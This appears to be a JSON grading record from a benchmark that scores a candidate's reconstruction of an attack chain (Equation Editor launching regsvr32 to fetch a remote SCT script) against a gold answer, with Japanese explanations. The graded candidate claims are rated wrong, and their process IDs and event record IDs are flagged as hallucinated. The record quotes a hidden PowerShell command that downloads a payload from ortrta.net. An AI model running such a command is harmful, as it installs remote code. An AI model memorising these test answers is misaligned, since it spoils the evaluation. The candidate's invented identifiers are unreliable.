@@ -1,0 +1,429 @@
+{
+  "case_id": "s3_pt_02_regsvr32_remote_sct",
+  "judge_summary_ja": "候補は regsvr32→PowerShell を中心とした別系統の振る舞いを復元しており、GOLD が示す「svchost(DcomLaunch)→EQNEDT32→regsvr32 による remote SCT 接続」の3段階チェーンを一切再現できていない。主体・操作・対象（および証拠）のいずれの必須項目も一致せず、順序も評価不能。証拠も CBC の正規テレメトリではなく audit_logs で、GOLD のクリティカルエビデンス要件を満たしていない。",
+  "chains": [
+    {
+      "chain_id": "s3_pt_02_regsvr32_remote_sct",
+      "gold_required_item_scores": [
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+          "step_id": "S3-02-S01",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "候補は svchost.exe / DcomLaunch (PID 648) を主体として復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+          "step_id": "S3-02-S01",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "当該ステップの操作「started」を示す一致がない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+          "step_id": "S3-02-S01",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象の EQNEDT32.EXE (PID 6032) を復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:critical_evidence",
+          "step_id": "S3-02-S01",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBC の正規テレメトリ行（Stage 3可視）を提示していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+          "step_id": "S3-02-S02",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "主体の EQNEDT32.EXE (PID 6032) を復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+          "step_id": "S3-02-S02",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "操作「started」の一致がない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+          "step_id": "S3-02-S02",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象の regsvr32.exe (PID 6124) を復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:critical_evidence",
+          "step_id": "S3-02-S02",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBC の正規テレメトリ行（Stage 3可視）を提示していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+          "step_id": "S3-02-S03",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "主体の regsvr32.exe (PID 6124) を復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+          "step_id": "S3-02-S03",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "操作「initiated connection using remote SCT command」を復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object",
+          "step_id": "S3-02-S03",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象「ortrta.net / 10.193.66.115:8080」を regsvr32 の動作として復元していない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:critical_evidence",
+          "step_id": "S3-02-S03",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "CBC の正規テレメトリ行（Stage 3可視）を提示していない。"
+        }
+      ],
+      "candidate_action_claim_scores": [
+        {
+          "candidate_claim_id": "C-S1",
+          "candidate_step_id": "S1",
+          "claim_excerpt": "regsvr32.exe process_start -> powershell.exe",
+          "normalized_action_claim_ja": "regsvr32.exe が powershell.exe を起動した",
+          "slot_scores": [
+            {
+              "slot_id": "C-S1:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "regsvr32.exe (PID 3992)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の主体はいずれも svchost(DcomLaunch)/EQNEDT32/regsvr32(PID 6124)であり、値も PID も一致しない。"
+            },
+            {
+              "slot_id": "C-S1:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "process_start",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "操作の語は類似するが、当該ステップ自体が GOLD と無関係。"
+            },
+            {
+              "slot_id": "C-S1:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "powershell.exe",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の対象は EQNEDT32 または regsvr32、もしくはネットワーク先であり、powershell.exe ではない。"
+            },
+            {
+              "slot_id": "C-S1:evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "audit_logs event_record_id=123456",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "GOLD は CBC の正規テレメトリ行のみをクリティカル証拠として許容。audit_logs は該当しない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C-S2",
+          "candidate_step_id": "S2",
+          "claim_excerpt": "powershell.exe network_download -> http://ortrta.net:8080/sF5riGj4K26DK.sct",
+          "normalized_action_claim_ja": "powershell.exe が ortrta.net:8080 から sF5riGj4K26DK.sct をダウンロードした",
+          "slot_scores": [
+            {
+              "slot_id": "C-S2:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "powershell.exe (PID 2340)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD のどの主体値（svchost/ EQNEDT32/ regsvr32(PID 6124)）にも一致しない。"
+            },
+            {
+              "slot_id": "C-S2:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "network_download",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の操作はプロセス起動または regsvr32 の remote SCT 接続であり、download ではない。"
+            },
+            {
+              "slot_id": "C-S2:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "http://ortrta.net:8080/sF5riGj4K26DK.sct",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の対象は「ortrta.net / 10.193.66.115:8080」の接続先であり、ファイルURLではない。"
+            },
+            {
+              "slot_id": "C-S2:command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest http://ortrta.net:8080/sF5riGj4K26DK.sct -OutFile C:\\Users\\aalsahee\\payload.exe",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD が要求するのは regsvr32 の remote SCT コマンドであり、powershell の IWR コマンドではない。"
+            },
+            {
+              "slot_id": "C-S2:evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "audit_logs event_record_id=123457",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC 正規テレメトリ行ではない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C-S3",
+          "candidate_step_id": "S3",
+          "claim_excerpt": "payload.exe file_write -> C:\\Users\\aalsahee\\AppData\\Local\\Temp\\*",
+          "normalized_action_claim_ja": "payload.exe が一時フォルダにファイルを書き込んだ",
+          "slot_scores": [
+            {
+              "slot_id": "C-S3:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "payload.exe (PID 3208)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD に payload.exe は登場しない。"
+            },
+            {
+              "slot_id": "C-S3:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "file_write",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の操作種別と一致しない。"
+            },
+            {
+              "slot_id": "C-S3:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "C:\\Users\\aalsahee\\AppData\\Local\\Temp\\*",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象は GOLD の要求範囲外。"
+            },
+            {
+              "slot_id": "C-S3:evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "audit_logs event_record_id=123458",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC 正規テレメトリ行ではない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C-S4",
+          "candidate_step_id": "S4",
+          "claim_excerpt": "cmd.exe file_read -> C:\\Users\\aalsahee\\payload.exe",
+          "normalized_action_claim_ja": "cmd.exe が payload.exe を読み取った",
+          "slot_scores": [
+            {
+              "slot_id": "C-S4:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "cmd.exe (PID 1880)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の主体ではない。"
+            },
+            {
+              "slot_id": "C-S4:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "file_read",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "操作が GOLD の対象外。"
+            },
+            {
+              "slot_id": "C-S4:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "C:\\Users\\aalsahee\\payload.exe",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "対象が GOLD の要求範囲外。"
+            },
+            {
+              "slot_id": "C-S4:evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "audit_logs event_record_id=123459",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC 正規テレメトリ行ではない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C-S5",
+          "candidate_step_id": "S5",
+          "claim_excerpt": "powershell.exe network_connect -> ortrta.net (10.193.66.115:8080, 10.193.66.115:8443)",
+          "normalized_action_claim_ja": "powershell.exe が ortrta.net(10.193.66.115:8080, 8443) に接続した",
+          "slot_scores": [
+            {
+              "slot_id": "C-S5:subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "powershell.exe (PID 2340)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD の主体（regsvr32.exe (PID 6124)）と一致しない。"
+            },
+            {
+              "slot_id": "C-S5:operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "network_connect",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "GOLD は regsvr32 の remote SCT コマンドによる接続作成であり、単なる network_connect ではない。"
+            },
+            {
+              "slot_id": "C-S5:object",
+              "kind": "object",
+              "candidate_slot_excerpt": "ortrta.net / 10.193.66.115:8080, 10.193.66.115:8443",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "接続先は一部重なるが、GOLD は regsvr32 文脈での「ortrta.net / 10.193.66.115:8080」に限定。主体・操作が不一致で、値にも8443が混在。"
+            },
+            {
+              "slot_id": "C-S5:evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "audit_logs event_record_id=123460",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC 正規テレメトリ行ではない。"
+            }
+          ]
+        }
+      ],
+      "order_pairs": [
+        {
+          "before_step_id": "S3-02-S01",
+          "after_step_id": "S3-02-S02",
+          "score": "0",
+          "reason_ja": "両ステップの行動が候補に存在せず、順序を評価できない。"
+        },
+        {
+          "before_step_id": "S3-02-S02",
+          "after_step_id": "S3-02-S03",
+          "score": "0",
+          "reason_ja": "両ステップの行動が候補に存在せず、順序を評価できない。"
+        }
+      ]
+    }
+  ],
+  "error_flags": {
+    "target_missing": [
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object"
+    ],
+    "chain_mixing": true,
+    "hallucinated_claims": [
+      "PID 3992",
+      "PID 2340",
+      "PID 3208",
+      "PID 1880",
+      "event_record_id 123456",
+      "event_record_id 123457",
+      "event_record_id 123458",
+      "event_record_id 123459",
+      "event_record_id 123460"
+    ],
+    "unsupported_evidence": [
+      "audit_logs event_record_id=123456",
+      "audit_logs event_record_id=123457",
+      "audit_logs event_record_id=123458",
+      "audit_logs event_record_id=123459",
+      "audit_logs event_record_id=123460"
+    ],
+    "contradicted_evidence": [],
+    "nearby_action_false_positives": [
+      "regsvr32.exe が powershell.exe を起動（S1）",
+      "powershell.exe が URL から .sct をダウンロード（S2）",
+      "payload.exe が一時フォルダへ書き込み（S3）",
+      "cmd.exe が payload.exe を読み取り（S4）",
+      "powershell.exe が ortrta.net(10.193.66.115:8080, 8443) に接続（S5）"
+    ],
+    "weak_grounding": true,
+    "false_positive_claims": [
+      "regsvr32.exe process_start -> powershell.exe",
+      "powershell.exe network_download -> http://ortrta.net:8080/sF5riGj4K26DK.sct",
+      "payload.exe file_write -> C:\\Users\\aalsahee\\AppData\\Local\\Temp\\*",
+      "cmd.exe file_read -> C:\\Users\\aalsahee\\payload.exe",
+      "powershell.exe network_connect -> ortrta.net (10.193.66.115:8080, 10.193.66.115:8443)"
+    ],
+    "notes_ja": [
+      "候補は PowerShell ベースの別シナリオを提示し、GOLD の Equation Editor→regsvr32 の連鎖を再現していない。",
+      "クリティカルエビデンスは CBC の正規テレメトリ行が必要だが、候補は audit_logs のみ。"
+    ]
+  },
+  "candidate_action_claim_count": 5,
+  "candidate_action_claim_slot_count": 21,
+  "candidate_action_claim_true_positive_slot_count": 0,
+  "hallucinated_claim_count": 9,
+  "unsupported_evidence_count": 5,
+  "contradicted_evidence_count": 0,
+  "nearby_action_fp_count": 5,
+  "main_missing_items": [
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object"
+  ],
+  "main_false_positive_claims": [
+    "regsvr32.exe process_start -> powershell.exe",
+    "powershell.exe network_download -> http://ortrta.net:8080/sF5riGj4K26DK.sct",
+    "payload.exe file_write -> C:\\Users\\aalsahee\\AppData\\Local\\Temp\\*",
+    "cmd.exe file_read -> C:\\Users\\aalsahee\\payload.exe",
+    "powershell.exe network_connect -> ortrta.net (10.193.66.115:8080, 10.193.66.115:8443)"
+  ]
+}
